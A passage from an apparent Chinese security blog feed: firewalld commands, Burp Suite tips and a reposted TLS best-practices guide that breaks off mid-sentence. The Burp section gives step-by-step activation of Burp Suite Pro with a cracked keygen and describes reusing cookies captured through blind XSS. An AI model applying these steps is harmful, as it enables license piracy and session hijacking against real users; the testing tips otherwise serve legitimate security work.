class="comment">cmd</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">zone=public</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">add</span><span class="literal">-</span><span class="comment">port=8081/tcp</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">permanent</span>    <span class="comment">（</span><span class="literal">-</span><span class="literal">-</span><span class="comment">permanent永久生效，没有此参数重启后失效）</span></span><br></pre></td></tr></table></figure></li><li><p>重新载入</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --reload</span></span><br></pre></td></tr></table></figure></li><li><p>查看</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--query-port</span>=80/tcp</span><br></pre></td></tr></table></figure></li><li><p>删除</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--remove-port</span>=80/tcp --permanent</span><br></pre></td></tr></table></figure></li><li><p>添加防火墙规则（对指定IP开放指定端口） </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent <span class="attribute">--add-rich-rule</span>=<span class="string">"rule family="</span>ipv4" source <span class="attribute">address</span>=<span class="string">"192.168.142.166"</span><span class="built_in"> port </span><span class="attribute">protocol</span>=<span class="string">"tcp"</span> <span class="attribute">port</span>=<span class="string">"27017"</span> accept/drop/reject<span class="string">"</span></span><br></pre></td></tr></table></figure></li><li><p>查看配置结果，验证配置</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --list-all</span></span><br></pre></td></tr></table></figure></li><li><p>删除规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent <span class="attribute">--remove-rich-rule</span>=<span class="string">"rule family="</span>ipv4" source <span class="attribute">address</span>=<span class="string">"192.168.142.166"</span><span class="built_in"> port </span><span class="attribute">protocol</span>=<span class="string">"tcp"</span> <span class="attribute">port</span>=<span class="string">"27017"</span> accept<span class="string">"</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;启动一个服务：&lt;/p&gt;
&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;literal&quot;&gt;start&lt;/span&gt; firewalld.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;关闭一个服务：&lt;/p&gt;
&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;built_in&quot;&gt;stop&lt;/span&gt; firewalld.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;重启一个服务：&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;systemctl&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;restart&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;firewalld&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.service&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;显示一个服务的状态：&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;systemctl&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;firewalld&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.service&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="linux" scheme="http://www.pa55w0rd.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Burp Suite使用</title>
    <link href="http://www.pa55w0rd.club/burp/"/>
    <id>http://www.pa55w0rd.club/burp/</id>
    <published>2018-12-13T10:53:31.000Z</published>
    <updated>2018-12-20T07:36:19.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Burp Suite是Web应用程序测试的最佳工具之一，其多种功能可以帮我们执行各种任务.请求的拦截和修改,扫描web应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查。</p><p>大家都很熟悉工具的使用了，这里介绍几个技巧，<strong>欢迎大家补充</strong><br><a id="more"></a></p><h2 id="0x01-专业版激活问题"><a href="#0x01-专业版激活问题" class="headerlink" title="0x01 专业版激活问题"></a>0x01 专业版激活问题</h2><p>使用burp-loader-keygen.jar注册机激活<br><br>支持1.6-目前最新的都能使用该注册机激活<br><br>注意有人利用这个破解补丁添加后门传播病毒，<a href="https://0x00sec.org/t/malware-reversing-burpsuite-keygen/5167" target="_blank" rel="noopener">后门分析帖子》》</a><br><br>原始注册机文件的MD5<br><br>burp-loader-keygen.jar     MD5: A4A02E374695234412E2C66B0649B757<br><br>源文件MD5官网查看：<br><a href="http://releases.portswigger.net" target="_blank" rel="noopener">http://releases.portswigger.net</a></p><p>使用burp-loader-keygen.jar破解的，每次都需要在该工具上启动，或使用命令行启动<code>java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro.jar</code></p><h3 id="激活步骤"><a href="#激活步骤" class="headerlink" title="激活步骤"></a>激活步骤</h3><ol><li>首先打开burp-loader-keygen.jar</li></ol><img src="/burp/1.png" title="test"><ol start="2"><li>点击burp，将复制内容粘贴到Enter license key,点击next</li></ol><img src="/burp/2.png" title="2test"><ol start="3"><li>点击Manual activation</li></ol><img src="/burp/3.png" title="2test"><ol start="4"><li>复制2 中的内容</li></ol><img src="/burp/4.png" title="2test"><ol start="5"><li>将复制内容粘贴到burp-loader-keygen.jar中的Activation Request，下方Activation Response会生成key，复制</li></ol><img src="/burp/5.png" title="2test"><ol start="6"><li>回到burp，将复制内容粘贴到3中，点击next，激活成功</li></ol><img src="/burp/6.png" title="2test"><img src="/burp/license.png" title="license"><h2 id="0x02-中文显示乱码问题"><a href="#0x02-中文显示乱码问题" class="headerlink" title="0x02 中文显示乱码问题"></a>0x02 中文显示乱码问题</h2><p>User options –Display – HTTP Message Display – Change font…<br>选择一个中文的字体格式，调整显示字体大小</p><img src="/burp/font.png" title="中文乱码"><h2 id="0x03-拦截响应包"><a href="#0x03-拦截响应包" class="headerlink" title="0x03 拦截响应包"></a>0x03 拦截响应包</h2><p>很多时候，在测试验证码等认证漏洞的时候，只在前端验证，可以通过修改响应包中的值绕过验证</p><p>Proxy – Options – Intercept Server Responses 勾选启用</p><img src="/burp/responses.png" title="responses"><h2 id="0x04-拦截指定url的请求响应包"><a href="#0x04-拦截指定url的请求响应包" class="headerlink" title="0x04 拦截指定url的请求响应包"></a>0x04 拦截指定url的请求响应包</h2><p>请求包设置</p><p>Proxy – Options – Intercept Client Requests – Add</p><img src="/burp/intercept_requests.png" title="intercept_requests"><p>响应包设置</p><p>Proxy – Options – Intercept Server Responses – Add，同上图设置</p><h2 id="0x05-自动替换cookie等"><a href="#0x05-自动替换cookie等" class="headerlink" title="0x05 自动替换cookie等"></a>0x05 自动替换cookie等</h2><p>如盲打xss，接收到cookie后，需要在每个请求包中都替换cookie</p><p>Proxy – Options – Match and Replace – Add(增加其他自动替换同理，可以自动替换请求/响应内容，这里以cookie为例)</p><img src="/burp/replace.png" title="replace"><h2 id="0x06-生成csrf-poc"><a href="#0x06-生成csrf-poc" class="headerlink" title="0x06 生成csrf poc"></a>0x06 生成csrf poc</h2><p>对拦截的请求，右键</p><img src="/burp/csrf.png" title="csrf"><h2 id="0x07-条件竞争漏洞测试"><a href="#0x07-条件竞争漏洞测试" class="headerlink" title="0x07 条件竞争漏洞测试"></a>0x07 条件竞争漏洞测试</h2><p>“竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p><p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><p>简单的说：本来你有100块钱，买一个商品要花100，你可以多开启多个线程去跑，有可能不止一个用户买成功</p><p>“竞争条件”漏洞有时很难通过黑盒/灰盒的方法来进行挖掘，因为这个漏洞很受环境因素的影响，比如网络延迟、服务器的处理能力等。一般都会通过对代码进行审计来发现此类问题</p><p>可以使用Burp的intruder功能来实现发送多个并发请求</p><p>将请求包发送至Intruder</p><p>Intruder – Payloads – Payload Stes </p><p>Payload type设置为NUll payloads</p><p>Payload Options 次数设置100次</p><img src="/burp/payload1.png" title="payload1"><p>Intruder – Options – Request Engine</p><p>线程数设置最大999 ，点击Start attack</p><img src="/burp/payload2.png" title="payload1"><h2 id="0x08-DNSlog功能"><a href="#0x08-DNSlog功能" class="headerlink" title="0x08 DNSlog功能"></a>0x08 DNSlog功能</h2><p>Burp Collaborator是从Burp suite v1.6.15版本添加的新功能，也就是DNSlog，监控DNS解析记录和HTTP访问记录，在检测盲注类漏洞很好用，也可以借助第三方服务</p><p>这里引出两个概念，<strong>In-band attack与 out-band attack（带内与带外攻击）</strong>，带内与带外的区别核心在于是否使用不同的通信通道。</p><ul><li>带内攻击<br>在一次攻击当中,只有一条通道，属于in-band（带内）攻击。常规的web测试模型就是我们向目标发送payloads，然后分析目标返回的数据。</li><li>带外攻击<br>现在同一次攻击下，不止一条信道，则属于out-band（带外）攻击。与外部服务交互行为发生在一个payload提交到目标应用上，导致目标通过某个网络协议和一个外部的域名进行信息交互。和ssrf攻击类似，让目标与Collaborator交互</li></ul><p>首先通过project options - misc - burp collaborator server - run health check 检查信道是否通畅</p><img src="/burp/colla_check.png" title="colla_check"><p>启用 主界面菜单项 burp - burp collaborator client 即可启用</p><p>点击Copy 头clipboard ，添加到payload中</p><img src="/burp/colla_client.png" title="colla_client"><p>带外信道根据不同场景一般用如下几类：</p><ol><li>burp 自带的 collaborator。主界面菜单项 burp - burp collaborator client 即可启用，可以在 project options - misc - burp collaborator server - run health check 检查信道是否通畅。无需第三方服务、不用注册，即开即用。由于我 burp 不离手，所以，这种带外信道方便、集成度高是它的最大优点，另外，burp 进行各类盲注（XXE、SQLi、CMDi 等等）的主动扫描时，也会用到 collaborator；</li><li>用脚本语言快速启用 web server。运行 python3 -m http.server 8653 或 php -S 0.0.0.0:8088 后，所有对它的 GET、HEAD 请求几类都能在日志中查看到。这种方式非常适用于攻击端与目标同在内网的场景，比如，无公网环境的 CTF 竞赛。不支持 POST 是它最大的短板；</li><li>借助第三方服务（<a href="http://ceye.io/、http://requestbin.net/）。效果上，类似第二种方式，但支持" target="_blank" rel="noopener">http://ceye.io/、http://requestbin.net/）。效果上，类似第二种方式，但支持</a> DNS 查询、HTTP POST 方法，此外，由于这是长期有效的服务，所以，很适用于那些非实时触发的带外访问请求（如，二次 SQLi）。你可以隔两三天再去看有无访问记录。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Burp Suite是Web应用程序测试的最佳工具之一，其多种功能可以帮我们执行各种任务.请求的拦截和修改,扫描web应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查。&lt;/p&gt;
&lt;p&gt;大家都很熟悉工具的使用了，这里介绍几个技巧，&lt;strong&gt;欢迎大家补充&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS 安全最佳实践（转发）</title>
    <link href="http://www.pa55w0rd.club/https-sec-deploy/"/>
    <id>http://www.pa55w0rd.club/https-sec-deploy/</id>
    <published>2018-12-12T10:39:23.000Z</published>
    <updated>2018-12-12T09:23:02.140Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文：<a href="https://blog.myssl.com/ssl-and-tls-deployment-best-practices/" target="_blank" rel="noopener">https://blog.myssl.com/ssl-and-tls-deployment-best-practices/</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSL/TLS 是一种简单易懂的技术，它很容易部署及运行。但想要部署的安全通常是不容易的。这也使系统管理员和开发者不得不去了解 SSL 和 TLS 相关的技术，掌握如何配置一个安全的 web 服务器或应用。无疑会耗费很大的精力去看相关的技术文档，乏味且宽泛。</p><p>本篇文档的目的在于如何让系统管理员或开发者用尽可能少的时间部署一个安全的 web 站点或应用，即 SSL 和 TLS 部署最佳实践。</p><h2 id="0x01-SSL-TLS部署"><a href="#0x01-SSL-TLS部署" class="headerlink" title="0x01 SSL/TLS部署"></a>0x01 SSL/TLS部署</h2><h3 id="1-1-证书和私钥"><a href="#1-1-证书和私钥" class="headerlink" title="1.1 证书和私钥"></a>1.1 证书和私钥</h3><p>在TLS中，所有的安全性都从服务器的密码标识开始；需要一个强大的私钥来防止攻击者进行模拟攻击。同样重要的是要有一个有效的和强大的证书，这将授予私有密匙作为一个特定主机名的权利。没有这两个基本的构建块，就没有其他东西可以安全了。</p><h4 id="1-1-1-使用-2048-位私钥"><a href="#1-1-1-使用-2048-位私钥" class="headerlink" title="1.1.1 使用 2048 位私钥"></a>1.1.1 使用 2048 位私钥</h4><p>对于大多数的 web 站点，提供一个 2048 的 RSA key 是足够安全的。<a id="more"></a>RSA 的公钥算法是被普遍支持的，这使得这个类型的 key 作为默认是足够安全的。对于 2048 位，这些 key 提供了大约 112 位的安全性。如果您想要比这更多的安全性，请注意 RSA key 的伸缩性不太好。想要获得 128 位的安全性，你需要 3072 位 RSA key，这会很大的影响性能。ECDSA key 提供了一种提供更好安全性和更好性能的替代方法。对于 256 位，ECDSA key 提供 128 位安全性。少数古董客户端不支持 ECDSA，但现代客户端是支持的。如果您不介意管理这样一个设置的开销，那么您可以同时部署 RSA 和 ECDSA 密钥。</p><h4 id="1-1-2-保护你的私钥"><a href="#1-1-2-保护你的私钥" class="headerlink" title="1.1.2 保护你的私钥"></a>1.1.2 保护你的私钥</h4><p>把你的私钥视为一项重要的资产，尽可能最大的使用你的私钥，限制最小的员工的访问。建议的政策包括以下内容:</p><ul><li>在可信计算机上用足够的熵生成私有密钥。一些 CA 为您提供生成私钥的功能，请尽量不要这样做。</li><li>密码保护 key 最初就不要存储在备份系统中。私钥密码在生产环境中起不了什么作用，因为有知识的攻击者总是能够从进程内存中检索密钥。有硬件设备(被称为硬件安全模块，或 HSMs)，即使在服务器折衷的情况下，也可以保护私有密匙，但是它们是昂贵的，因此仅适用于具有严格安全性需求的组织。</li><li>妥协后，撤销旧证书并生成新密钥。</li><li>每年更新证书，如果您可以自动化过程，则更频繁。大多数网站都应该假定不可靠的妥协证书被撤销; 因此，具有较短使用寿命的证书在实践中更加安全。</li><li>除非保持相同的密钥对于公钥密钥很重要，否则每当获得新证书时，还应该生成新的私钥。</li></ul><h4 id="1-1-3-覆盖您的域名"><a href="#1-1-3-覆盖您的域名" class="headerlink" title="1.1.3 覆盖您的域名"></a>1.1.3 覆盖您的域名</h4><p>确保您的证书涵盖您希望与网站一起使用的所有名称。您的目标是避免无效的证书警告，这会混淆用户，削弱他们的信心。</p><p>即使您期望只使用一个域名，请记住，您无法控制用户到达该网站的方式或其他人如何链接到该网站。在大多数情况下，您应该确保该证书与 www 前缀有关（例如，它适用于 example.com 和<br><a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> ）。经验法则是，安全的 Web 服务器应该具有对配置为指向它的每个 DNS 名称有效的证书。</p><p>通配符证书能满足更广泛的需求，但如果准备将密钥暴露给更多的人员，特别是跨团队或部门，则避免使用它们。换句话说，访问私钥的人越少越好。还要注意，证书共享会创建一个可以被滥用的将漏洞从一个网站或服务器传输到使用相同证书的所有其他站点和服务器（即使底层私钥不同，只要证书域名匹配）的绑定。</p><h4 id="1-1-4-从可信-CA-获取证书"><a href="#1-1-4-从可信-CA-获取证书" class="headerlink" title="1.1.4 从可信 CA 获取证书"></a>1.1.4 从可信 CA 获取证书</h4><p>选择对其证书业务和安全性可靠和认真的认证中心（CA）。选择 CA 时，请考虑以下条件：</p><p><strong>安全状态</strong> 所有CA都经过定期审核，但有些则比其他 CA 更为严重。弄清哪些在这方面做的更好并不容易，但一个选择是检查他们的安全历史，更重要的是，他们如何反应妥协，如果他们从错误中学到了经验，这将更有利。</p><p><strong>业务重点</strong> CA 的活动构成其业务的重要组成部分，如果事情发生严重错误，其所有事情都将丢失，并且在其他地方追逐潜在的更有利可图的机会可能不会忽视其证书部门。</p><p><strong>提供的服务</strong> 至少，您选择的 CA 应提供对证书吊销列表（CRL）和在线证书状态协议（OCSP）撤销方法的支持，具有稳定的网络可用性和性能。许多网站对域验证的证书感到满意，但您也应该考虑是否需要扩展验证（EV）证书。在任一种情况下，您都应该选择公钥算法。大多数网站今天使用 RSA，但由于其性能优势，ECDSA 在未来可能会变得重要。</p><p><strong>证书管理</strong> 选项如果您需要大量证书并在复杂环境中运行，请选择一个 CA，为您提供良好的管理工具。</p><p>支持选择一个 CA，如果需要的话可以给您很好的支持。</p><blockquote><p>   注意<br><br>   为了获得最佳效果，请提前获得证书，并在部署到生产之前至少一周。这种做法<br>（1）有助于避免在计算机上没有正确时间的一些用户的证书警告;<br>（2）有助于避免与 CA 需要额外时间的 CA 失败的撤销检查，以向 OCSP 响应者传播有效的新证书。<br>随着时间的推移，尝试将这个“热身”期延长至 1-3 个月。同样，不要等到你的证书即将到期以替换它们。留下额外的几个月也会帮助时钟不正确的人在另一个方向。</p></blockquote><h4 id="1-1-5-使用强签名算法"><a href="#1-1-5-使用强签名算法" class="headerlink" title="1.1.5 使用强签名算法"></a>1.1.5 使用强签名算法</h4><p>证书安全性取决于</p><ol><li>用于签署证书的私钥的强度，</li><li>签名中使用的散列函数的强度。</li></ol><p>直到最近，大多数证书都依赖于 SHA1 散列函数，现在被认为是不安全的。因此，我们正在向 SHA256 转型。截至 2016 年 1 月，您无法从公共 CA 获取 SHA1 证书。现有的 SHA1 证书将继续工作（在某些浏览器中有警告），但只能到 2016 年底。</p><h3 id="1-2-配置"><a href="#1-2-配置" class="headerlink" title="1.2 配置"></a>1.2 配置</h3><p>使用正确的 TLS 服务器配置，您可以确保将凭据正确呈现给站点的访问者，仅使用安全的加密原语，并减轻所有已知的缺陷。</p><h4 id="1-2-1-使用完整的证书链"><a href="#1-2-1-使用完整的证书链" class="headerlink" title="1.2.1 使用完整的证书链"></a>1.2.1 使用完整的证书链</h4><p>在大多数部署中，仅服务器证书不够的; 需要两个或多个证书来建立完整的信任链。当部署具有有效证书但没有所有必要的中间证书的服务器时，会发生常见的配置问题。为避免这种情况，只需使用 CA 提供给您的所有证书。</p><p>无效的证书链有效地使服务器证书无效并导致浏览器警告。实际上，这个问题有时难以诊断，因为一些浏览器可以重构不完整的链，有些浏览器不能重建。所有浏览器都倾向于缓存和重用中间证书。</p><h4 id="1-2-2-使用安全的协议"><a href="#1-2-2-使用安全的协议" class="headerlink" title="1.2.2 使用安全的协议"></a>1.2.2 使用安全的协议</h4><p>SSL／TLS 系列中有五种协议：SSL v2，SSL v3，TLS v1.0，TLS v1.1和TLS v1.2：</p><ul><li>SSL v2 是不安全的，不能使用。此协议版本非常糟糕，即使它们位于完全不同的服务器（DROWN 攻击）上也可以用来攻击具有相同名称的RSA 密钥和站点。</li><li>当与 HTTP（POODLE 攻击）一起使用时，SSL v3 是不安全的，当与其他协议一起使用时，SSL v3 是弱的。它也是过时的，不应该被使用。</li><li>TLS v1.0 也是不应该使用的传统协议，但在实践中通常仍然是必需的。其主要弱点（BEAST）在现代浏览器中得到缓解，但其他问题仍然存在。</li><li>TLS v1.1 和 v1.2 都没有已知的安全问题，只有 v1.2 提供了现代的加密算法。</li></ul><p>TLS v1.2 应该是您的主要协议，因为它是唯一提供现代认证加密（也称为 AEAD）的版本。如果您今天不支持 TLS v1.2，则缺乏安全性。</p><p>为了支持较旧的客户端，您可能需要继续支持 TLS v1.0 和TLS v1.1。但是，您应该计划在不久的将来退出 TLS v1.0。例如，PCI DSS 标准将要求所有接受信用卡付款的网站在 2018 年 6 月之前移除对 TLS v1.0 的支持。</p><p>目前正在开展设计 TLS v1.3 的工作，其目的是消除所有过时和不安全的功能，并进行改进，以保持我们的通信在未来几十年内的安全。</p><h4 id="1-2-3-使用安全的套件"><a href="#1-2-3-使用安全的套件" class="headerlink" title="1.2.3 使用安全的套件"></a>1.2.3 使用安全的套件</h4><p>为了安全通信，您必须首先确定您正在与所需方（而不是通过将窃听的其他人）直接沟通并安全地交换数据。在 SSL 和 TLS 中，密码套件定义了如何进行安全通信。它们由不同的建筑组成，通过多样性实现安全。如果发现其中一个构建块软弱或不安全，那么您应该可以切换到另一个。</p><p>您应该主要依靠提供强身份验证和密钥交换，前向保密和至少 128 位加密的 AEAD 套件。还有一些其他较弱的套房可能仍然得到支持，只要它们只能与不支持任何更好的老客户进行协商。</p><p>有几个过时的加密原语必须避免：</p><ul><li>匿名 Diffie-Hellman（ADH）套件不提供身份验证。</li><li>NULL 密码套件不提供加密。</li><li>导出密码套件在连接中协商时不安全，但也可以针对更喜欢更强大的套件（FREAK攻击）的服务器使用。</li><li>弱密码（通常为 40 和 56 位）的套件使用可以轻松破坏的加密。</li><li>RC4 是不安全的。<a href="http://www.rfc-editor.org/rfc/rfc7465.txt" target="_blank" rel="noopener">rfc7465</a></li><li>3DES 缓慢而虚弱。</li></ul><p>使用以RSA和ECDSA键为基础的以下套件配置，作为起点：<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_128_GCM_SHA256</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_256_GCM_SHA384</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA256</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA384</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_128_GCM_SHA256</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_256_GCM_SHA384</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA256</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA384</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_128_GCM_SHA256</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_256_GCM_SHA384</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA256</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA256</span><br></pre></td></tr></table></figure></p><blockquote><p>警告<br><br>我们建议您始终首先在分段环境中测试TLS配置，仅在确定所有内容按预期工作时将更改应用到生产环境。请注意，以上是一个通用列表，并不是所有系统（特别是较旧的）支持所有套件。这就是为什么测试很重要，推荐您使用《<a href="https://myssl.com/" target="_blank" rel="noopener">SSL/TLS安全评估</a>》进行检查。</p></blockquote><p>上述示例配置使用标准 TLS 套件名称。一些平台使用非标准名称; 有关详细信息，请参阅您的平台的文档。例如，以下套件名称将与OpenSSL 一起使用：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ECDHE-ECDSA-AES128-GCM-<span class="keyword">SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES256-GCM-SHA384</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES128-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES256-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES128-SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES256-SHA384</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES128-GCM-SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES256-GCM-SHA384</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES128-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES256-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES128-SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES256-SHA384</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES128-GCM-SHA256</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES256-GCM-SHA384</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES128-SHA</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES256-SHA</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES128-SHA256</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES256-SHA256</span></span><br></pre></td></tr></table></figure></p><h4 id="1-2-4-选择合适的协议"><a href="#1-2-4-选择合适的协议" class="headerlink" title="1.2.4 选择合适的协议"></a>1.2.4 选择合适的协议</h4><p>在SSL v3及更高版本的协议版本中，客户端提交他们支持的密码套件列表，服务器从列表中选择一个用于连接的套件。然而，并不是所有的服务器都做得很好，有些将从客户端列表中选择第一个支持的套件。使服务器主动选择最佳可用加密套件对于实现最佳安全性至关重要。</p><h4 id="1-2-5-使用-FS"><a href="#1-2-5-使用-FS" class="headerlink" title="1.2.5 使用 FS"></a>1.2.5 使用 FS</h4><p>前向保密（有时也称为完全前向保密）是一种协议功能，可实现不依赖服务器私钥的安全对话。对于不提前向保密的密码套件，可以恢复服务器的私钥的人就可以解密所有较早记录的加密对话（也就是可以先大量记录密文，再解密，比如您的证书到期后没有正确销毁，它的私钥就能用来解密非PFS的密文）。您需要支持并喜欢 ECDHE 